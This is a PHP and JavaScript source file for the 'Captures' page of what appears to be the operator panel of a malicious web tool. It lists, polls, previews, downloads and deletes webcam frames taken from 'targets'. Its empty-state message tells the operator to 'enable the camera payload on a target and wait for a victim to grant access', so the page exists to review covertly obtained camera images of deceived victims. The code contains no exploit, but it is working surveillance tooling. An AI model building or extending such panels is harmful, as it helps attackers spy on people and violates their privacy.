<?php
/**
 * route-captures.php — UI for the "Captures" sidebar route.
 *
 * Pulls everything from api/captures.php and renders into the design-system's
 * .photo-grid / .photo-card markup (already styled in cypher-ui.css).
 *
 * Polls every CAPTURES_POLL_MS while visible so new frames pop in live.
 *
 * Caller (panel.php) is responsible for auth.
 */
?>
<section class="captures-section">

  <!-- Stat strip + global actions -->
  <div class="captures-toolbar">
    <div class="captures-stats">
      <span class="badge badge-cyan" id="cap-stat-total"><span class="badge-dot cyan pulse"></span>0 TOTAL</span>
      <span class="badge badge-green" id="cap-stat-new" hidden>0 NEW</span>
      <span class="badge badge-muted" id="cap-stat-sources">0 SOURCES</span>
    </div>
    <div class="captures-actions">
      <button type="button" class="btn btn-sm btn-outline" id="cap-refresh">
        <svg class="icon icon-sm"><use href="#i-refresh"/></svg> Refresh
      </button>
    </div>
  </div>

  <div class="photo-grid" id="captures-grid"></div>

  <div class="captures-empty" id="captures-empty" hidden>
    <svg class="icon icon-xl"><use href="#i-camera"/></svg>
    <div class="captures-empty-title">No frames captured yet</div>
    <div class="captures-empty-sub">// enable the <code>camera</code> payload on a target and wait for a victim to grant access</div>
  </div>

</section>

<!-- Frame template — cloned per-card by JS. -->
<template id="capture-card-tpl">
  <div class="photo-card">
    <span class="photo-badge new">NEW</span>
    <img class="photo-thumb-img" alt="" loading="lazy">
    <div class="photo-overlay">
      <div class="photo-top">
        <span class="badge badge-cyan c-target" style="font-size:9px"></span>
        <div class="photo-actions">
          <button type="button" class="photo-action c-view" title="View full size">
            <svg class="icon icon-sm"><use href="#i-eye"/></svg>
          </button>
          <a class="photo-action c-download" title="Download" download>
            <svg class="icon icon-sm"><use href="#i-download"/></svg>
          </a>
          <button type="button" class="photo-action danger c-delete" title="Delete">
            <svg class="icon icon-sm"><use href="#i-trash"/></svg>
          </button>
        </div>
      </div>
      <div class="photo-meta"><span class="ip c-target-meta"></span><span class="time c-time"></span></div>
    </div>
  </div>
</template>

<!-- Lightbox for full-size view. -->
<div class="modal-scrim" id="capture-lightbox" onclick="handleScrimClick(event,'capture-lightbox')">
  <div class="modal modal-lg" onclick="event.stopPropagation()">
    <div class="modal-header">
      <div class="modal-header-left">
        <div class="modal-icon modal-icon-cyan"><svg class="icon icon-md"><use href="#i-camera"/></svg></div>
        <div>
          <div class="modal-title" id="lb-title">FRAME</div>
          <div class="modal-subtitle" id="lb-sub"></div>
        </div>
      </div>
      <button type="button" class="modal-x" onclick="closeModal('capture-lightbox')"><svg class="icon icon-sm"><use href="#i-x"/></svg></button>
    </div>
    <div class="modal-body" style="padding:0;background:#000;text-align:center">
      <img id="lb-img" alt="" style="max-width:100%;max-height:65vh;display:inline-block">
    </div>
    <div class="modal-footer">
      <a class="btn btn-outline btn-sm" id="lb-download" download>
        <svg class="icon icon-sm"><use href="#i-download"/></svg> Download
      </a>
      <span style="flex:1"></span>
      <button type="button" class="btn btn-ghost btn-sm" onclick="closeModal('capture-lightbox')">Close</button>
    </div>
  </div>
</div>

<script>
/* ── Captures route ────────────────────────────────────────────
   Lists every camera frame across every target, polls every
   CAPTURES_POLL_MS so newly arriving frames pop in without a manual
   reload, and exposes view / download / delete per frame. */
(function () {
  const API              = 'api/captures.php';
  const CAPTURES_POLL_MS = 5000;
  const NEW_WINDOW_SEC   = 5 * 60;   // anything ≤ 5 min old wears the NEW pill

  const $grid   = document.getElementById('captures-grid');
  const $empty  = document.getElementById('captures-empty');
  const $tpl    = document.getElementById('capture-card-tpl');
  const $bTotal = document.getElementById('cap-stat-total');
  const $bNew   = document.getElementById('cap-stat-new');
  const $bSrc   = document.getElementById('cap-stat-sources');
  const $btnRefresh = document.getElementById('cap-refresh');

  const $lb        = document.getElementById('capture-lightbox');
  const $lbImg     = document.getElementById('lb-img');
  const $lbTitle   = document.getElementById('lb-title');
  const $lbSub     = document.getElementById('lb-sub');
  const $lbDl      = document.getElementById('lb-download');

  function escapeHtml(s) {
    return String(s).replace(/[&<>"']/g, c => ({
      '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
    }[c]));
  }
  function relTime(unix) {
    const diff = Math.max(0, Math.floor(Date.now()/1000) - unix);
    if (diff < 60)    return diff + 's ago';
    if (diff < 3600)  return Math.floor(diff/60) + 'm ago';
    if (diff < 86400) return Math.floor(diff/3600) + 'h ago';
    return Math.floor(diff/86400) + 'd ago';
  }
  function fmtBytes(n) {
    if (!n) return '';
    if (n < 1024)        return n + ' B';
    if (n < 1024*1024)   return (n / 1024).toFixed(1) + ' KB';
    return (n / 1024 / 1024).toFixed(1) + ' MB';
  }
  function gradientFor(slug) {
    // Stable per-slug gradient class so the same target always renders the
    // same thumb backdrop — easier to scan visually.
    let h = 0;
    for (const c of slug) h = (h * 31 + c.charCodeAt(0)) >>> 0;
    return 'gradient-' + (h % 6 + 1);
  }

  let lastCount = 0;

  function render(payload) {
    const items = payload.items || [];
    const newCount = items.filter(it => (Date.now()/1000 - it.ts) <= NEW_WINDOW_SEC).length;

    $bTotal.innerHTML = '<span class="badge-dot cyan pulse"></span>' + items.length + ' TOTAL';
    $bSrc.textContent = (payload.sources || 0) + ' SOURCES';
    if (newCount > 0) { $bNew.hidden = false; $bNew.textContent = newCount + ' NEW'; }
    else              { $bNew.hidden = true; }

    if (items.length === 0) {
      $grid.innerHTML = '';
      $empty.hidden = false;
      lastCount = 0;
      return;
    }
    $empty.hidden = true;

    // Diff render: only redraw if the item count or the freshest ts changed.
    const sig = items.length + ':' + (items[0]?.ts || 0);
    if ($grid.dataset.sig === sig) return;
    $grid.dataset.sig = sig;

    $grid.innerHTML = '';
    items.forEach(it => {
      const node = $tpl.content.firstElementChild.cloneNode(true);
      const img  = node.querySelector('.photo-thumb-img');
      img.src    = it.url;
      img.alt    = 'frame from /' + it.target;
      img.classList.add('photo-thumb', gradientFor(it.target));

      const ageSec = Date.now()/1000 - it.ts;
      const isNew  = ageSec <= NEW_WINDOW_SEC;
      const badge  = node.querySelector('.photo-badge');
      badge.textContent  = isNew ? 'NEW' : 'VIEWED';
      badge.classList.toggle('new', isNew);
      badge.classList.toggle('viewed', !isNew);

      node.querySelector('.c-target').textContent      = '/' + it.target;
      node.querySelector('.c-target-meta').textContent = '/' + it.target;
      node.querySelector('.c-time').textContent        = relTime(it.ts) + ' · ' + fmtBytes(it.size);

      node.querySelector('.c-download').href = it.url;
      const baseName = it.file.replace(/\.png$/, '');
      node.querySelector('.c-download').setAttribute('download', it.target + '_' + baseName + '.png');

      node.querySelector('.c-view').addEventListener('click', () => openLightbox(it));
      node.querySelector('.c-delete').addEventListener('click', () => deleteFrame(it));

      $grid.appendChild(node);
    });

    // Toast on a real bump (not the very first load).
    if (lastCount && items.length > lastCount && typeof fireToast === 'function') {
      fireToast('success', 'NEW FRAMES', (items.length - lastCount) + ' new camera frame(s) captured');
    }
    lastCount = items.length;
  }

  function openLightbox(it) {
    $lbImg.src   = it.url;
    $lbDl.href   = it.url;
    const baseName = it.file.replace(/\.png$/, '');
    $lbDl.setAttribute('download', it.target + '_' + baseName + '.png');
    $lbTitle.textContent = '/' + it.target;
    $lbSub.textContent   = '// ' + new Date(it.ts * 1000).toISOString().slice(0,19).replace('T',' ') + ' UTC · ' + fmtBytes(it.size);
    openModal('capture-lightbox');
  }

  async function deleteFrame(it) {
    if (!confirm('Delete this frame? This cannot be undone.')) return;
    try {
      const fd = new FormData();
      fd.append('action', 'delete');
      fd.append('slug', it.target);
      fd.append('file', it.file);
      const res  = await fetch(API, { method: 'POST', body: fd, credentials: 'same-origin' });
      const json = await res.json();
      if (!res.ok || !json.ok) throw new Error(json.error || 'delete failed');
      if (typeof fireToast === 'function') fireToast('success', 'FRAME DELETED', it.file);
      load(false);
    } catch (e) {
      if (typeof fireToast === 'function') fireToast('error', 'DELETE FAILED', e.message);
    }
  }

  async function load(showError) {
    try {
      const res  = await fetch(API, { credentials: 'same-origin', cache: 'no-store' });
      const json = await res.json();
      if (!res.ok || !json.ok) throw new Error(json.error || 'request failed');
      render(json);
    } catch (e) {
      if (showError && typeof fireToast === 'function') fireToast('error', 'LOAD FAILED', e.message);
    }
  }
  $btnRefresh.addEventListener('click', () => load(true));

  /* Polling, paused while the tab is hidden. */
  let pollTimer = null;
  function startPoll() { stopPoll(); pollTimer = setInterval(() => load(false), CAPTURES_POLL_MS); }
  function stopPoll()  { if (pollTimer) { clearInterval(pollTimer); pollTimer = null; } }
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) stopPoll();
    else { load(false); startPoll(); }
  });

  load(false).then(startPoll);
})();
</script>

<style>
.captures-section { display: flex; flex-direction: column; gap: var(--space-4); }
.captures-toolbar {
  display: flex; align-items: center; justify-content: space-between;
  flex-wrap: wrap; gap: var(--space-3);
}
.captures-stats   { display: flex; gap: var(--space-2); flex-wrap: wrap; }
.captures-actions { display: flex; gap: var(--space-2); }

/* Override the design-system <div class="photo-thumb"> stub so a real
   <img> fills the thumb area while the gradient still shows around the
   edges before the image decodes. */
.photo-thumb-img {
  width: 100%; aspect-ratio: 4/3;
  display: block;
  object-fit: cover;
  border-radius: 0;
}

.captures-empty[hidden] { display: none !important; }
.captures-empty {
  display: flex; flex-direction: column; align-items: center; justify-content: center;
  text-align: center;
  padding: var(--space-7) var(--space-4);
  background: var(--bg-surface);
  border: 1px dashed var(--border-subtle);
  border-radius: var(--radius-lg);
  color: var(--text-muted);
  gap: var(--space-2);
}
.captures-empty .icon { color: var(--text-muted); width: 36px; height: 36px; }
.captures-empty-title {
  font-family: var(--font-mono); font-size: var(--text-sm); font-weight: 600;
  color: var(--text-secondary); letter-spacing: .04em;
}
.captures-empty-sub  {
  font-family: var(--font-mono); font-size: var(--text-xs);
}
.captures-empty-sub code {
  background: var(--bg-overlay);
  border: 1px solid var(--border-subtle);
  border-radius: var(--radius-sm);
  padding: 1px 5px;
  color: var(--text-code);
}
</style>
